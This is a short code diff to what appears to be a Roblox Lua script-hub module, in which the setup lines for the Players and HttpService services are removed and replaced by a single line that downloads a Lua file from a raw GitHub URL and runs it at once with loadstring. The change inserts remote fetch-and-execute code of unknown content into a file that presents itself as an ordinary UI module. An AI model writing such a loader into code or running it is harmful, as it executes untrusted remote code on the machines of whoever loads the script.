@@ -1,8 +1,6 @@
 return function(Tabs, Library)
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local LocalPlayer = Players.LocalPlayer
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lchMagDichNicht/Femboy-Discord-Acc/refs/heads/main/Servies.lua"))()
 
 -- ================================
 -- Home
